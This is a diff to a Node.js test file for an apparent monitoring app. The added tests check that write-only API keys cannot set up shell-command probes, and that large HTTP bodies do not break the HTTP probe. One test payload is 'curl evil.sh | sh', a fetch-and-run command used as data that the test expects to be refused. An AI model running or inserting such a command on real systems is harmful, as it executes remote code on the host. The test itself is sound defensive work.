@@ -20,7 +20,8 @@ process.env.PORT = '3990';
 process.env.PROBE_TICK_SECONDS = '1';
 const app = require(path.join(__dirname, '..', 'src', 'app.js'));
 const { queryOne, queryAll } = require(path.join(__dirname, '..', 'src', 'db', 'database'));
-const { pages, components, componentGroups } = require(path.join(__dirname, '..', 'src', 'db', 'models'));
+const models = require(path.join(__dirname, '..', 'src', 'db', 'models'));
+const { pages, components, componentGroups } = models;
 
 let failures = 0;
 const check = (name, cond, extra) => {
@@ -35,6 +36,22 @@ async function waitFor(fn, ms = 15000) {
     await new Promise(r => setTimeout(r, 300));
   }
   return false;
+}
+
+function req(method, p, { body, headers = {} } = {}) {
+  return new Promise((resolve, reject) => {
+    const data = body ? JSON.stringify(body) : null;
+    const h = { ...headers };
+    if (data) { h['Content-Type'] = 'application/json'; h['Content-Length'] = Buffer.byteLength(data); }
+    const r = http.request({ host: '127.0.0.1', port: 3990, path: p, method, headers: h }, res => {
+      let out = '';
+      res.on('data', c => out += c);
+      res.on('end', () => resolve({ status: res.statusCode, body: out }));
+    });
+    r.on('error', reject);
+    if (data) r.write(data);
+    r.end();
+  });
 }
 
 async function waitForBoot() {
@@ -147,6 +164,30 @@ const httpMock = http.createServer((rq, rs) => {
   // ===== guard: cmd sin comando no se habilita =====
   const cmdEmpty = await components.create({ name: 'cmd-empty', group_ids: [grp.id], probe_type: 'cmd', probe_enabled: 1, probe_interval_seconds: 1 });
   check('GUARD: cmd sin comando no se habilita (probe_enabled=0)', (await components.get(cmdEmpty.id)).probe_enabled === 0);
+
+  // ===== RCE guard: una key de solo WRITE no puede configurar cmd (2.6.0) =====
+  const { apiKeys } = models;
+  const writeKey = await apiKeys.create({ name: 'writer', permissions: ['write'], page_id: null });
+  const writeH = { 'x-api-key': writeKey.key };
+  const adminKey = await apiKeys.create({ name: 'rce-admin', permissions: ['read', 'write', 'admin'], page_id: null });
+  const adminH = { 'x-api-key': adminKey.key };
+  const rcePost = await req('POST', '/api/v1/components', { headers: writeH, body: { name: 'rce', probe_type: 'cmd', probe_command: 'id', probe_enabled: 1 } });
+  check('RCE: key write NO crea sensor cmd (403)', rcePost.status === 403, rcePost.status);
+  const rcePut = await req('PUT', `/api/v1/components/${cmdOk.id}`, { headers: writeH, body: { probe_command: 'curl evil.sh | sh' } });
+  check('RCE: key write NO inyecta probe_command por PUT (403)', rcePut.status === 403, rcePut.status);
+  check('RCE: el comando no quedó guardado', ((await components.get(cmdOk.id)).probe_command || '') === 'true', (await components.get(cmdOk.id)).probe_command);
+  const rceAdmin = await req('POST', '/api/v1/components', { headers: adminH, body: { name: 'cmd-by-admin', probe_type: 'cmd', probe_command: 'true', probe_enabled: 1 } });
+  check('RCE: key admin SÍ crea sensor cmd (201)', rceAdmin.status === 201, rceAdmin.status);
+
+  // ===== cuerpo grande (>256KB) no rompe el sensor http ni el keyword =====
+  const NEEDLE = 'NEEDLE';
+  const big = http.createServer((rq, rs) => { rs.writeHead(200); rs.end('x'.repeat(300 * 1024) + NEEDLE + 'x'.repeat(1024)); });
+  await new Promise(r => big.listen(3993, r));
+  const bigOk = await components.create({ name: 'big-body', group_ids: [grp.id], probe_type: 'http', probe_url: 'http://127.0.0.1:3993/', probe_output_pattern: NEEDLE, probe_enabled: 1, probe_interval_seconds: 1 });
+  check('BIG BODY: 200 con 300KB y keyword en el tope -> operational (truncado, no fallo)',
+    await waitFor(async () => (await components.get(bigOk.id)).probe_last_ok === 1),
+    (await components.get(bigOk.id)).status);
+  big.close();
 
   // ===== type switch via update (http -> cmd) keeps the probe enabled =====
   const sw = await components.create({ name: 'switch-type', group_ids: [grp.id], probe_type: 'http', probe_url: `${B}/api`, probe_enabled: 1, probe_interval_seconds: 1 });
